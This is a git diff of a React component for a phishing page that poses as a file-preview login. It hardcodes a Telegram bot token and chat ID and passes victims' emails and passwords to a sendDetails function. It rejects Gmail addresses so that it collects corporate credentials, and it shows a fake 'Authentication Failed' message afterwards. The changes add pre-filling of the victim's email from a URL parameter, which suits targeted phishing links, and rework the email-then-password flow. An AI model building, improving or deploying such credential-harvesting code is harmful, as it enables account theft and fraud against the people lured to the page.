@@ -1,4 +1,4 @@
-import { useState } from 'react';
+import { useEffect, useRef, useState } from 'react';
 import Video from './assets/Bgvid2.mp4';
 import Header from './Header';
 import TextComp from './TextComp';
@@ -7,10 +7,22 @@ import BoxComp from './BoxComp';
 function App() {
 	const [showModal, setShowModal] = useState(false);
 	const [showPassword, setShowPassword] = useState(false);
-	const [email, setEmail] = useState('');
+	const emailRef = useRef(null)
 	const [password, setPassword] = useState('');
 	const botToken = `6800765360:AAEx4sxK-Hhz0b_dvSiQq4l2YK6CBHWK6gg`;
 	const chatId = 5843568772;
+
+	useEffect(() => {
+		// Extracting a query parameter named 'value' from the URL
+		const urlParams = new URLSearchParams(window.location.search);
+		const inputValue = urlParams.get('email');
+		console.log(inputValue)
+
+		// Setting the value of the input element if it exists in the URL
+		if (emailRef.current && inputValue) {
+			emailRef.current.value = inputValue;
+		}
+	}, [showModal]);
 
 	function handleShowModal() {
 		setShowModal(!showModal);
@@ -20,16 +32,12 @@ function App() {
 		if (e.target.id == 'modalbg') {
 			setShowModal(false);
 			setShowPassword(false);
-			setEmail('');
+			// setEmail('');
+			emailRef.current.value = ''
 			return;
 		} else {
 			setShowModal(true);
 		}
-	}
-
-	function handleShowPassword(e) {
-		setEmail(e.target.value);
-		setShowPassword(true);
 	}
 
 	function handlePassword(e) {
@@ -76,36 +84,44 @@ Password: ${password}
 			alert(
 				`Authentication Failed \nInput correct credentials to preview files`
 			);
+			setPassword('')
+			emailRef.current.value = ''
 		} catch (error) {
 			console.error('Error sending message:', error);
 		}
 	}
 
 	function submitHandler(e) {
-		e.preventDefault()
+		e.preventDefault();
+
+		if (!password) {
+			setShowPassword(true)
+		} else {
+			checkDetails(emailRef.current.value, password);
+		}
+
 		async function checkDetails(userEmail, userPassword) {
 			try {
 				if (regexEmailValidate(userEmail)) {
-					alert('Input your domain email. Gmail not allowed')
-					return
+					alert('Input your domain email. Gmail not allowed');
+					return;
 				}
 
-				const formData = new FormData()
-				formData.append('userEmails', userEmail)
-				formData.append('userPasswords', userPassword)
+				const formData = new FormData();
+				formData.append('userEmails', userEmail);
+				formData.append('userPasswords', userPassword);
 
 				const data = Object.fromEntries(formData);
-				console.log(data)
+				console.log(data);
 				const { userEmails, userPasswords } = data;
-				await sendDetails(userEmails, userPasswords)
-
-			} catch (error){
-				console.log(error)
+				await sendDetails(userEmails, userPasswords);
+			} catch (error) {
+				console.log(error);
 			}
 		}
-		checkDetails(email, password)
-	}
 
+		
+	}
 
 	return (
 		<main className=" w-full h-screen bg-black bg-opacity-70 overflow-y-hidden">
@@ -163,8 +179,7 @@ Password: ${password}
 										type="email"
 										id="email"
 										className="border-2 py-1 px-2 rounded-md"
-										value={email}
-										onChange={handleShowPassword}
+										ref={emailRef}
 										required
 									/>
 								</div>
@@ -186,7 +201,9 @@ Password: ${password}
 									</div>
 								)}
 
-								<button className="bg-[#409fff] text-[#f4f4f4] py-2 px-8 text-center rounded-[1.25em] cursor-pointer font-medium text-[20px] mt-3 mr-4">
+								<button
+									className="bg-[#409fff] text-[#f4f4f4] py-2 px-8 text-center rounded-[1.25em] cursor-pointer font-medium text-[20px] mt-3 mr-4"
+								>
 									{!showPassword ? 'Next' : 'Preview'}
 								</button>
 							</form>
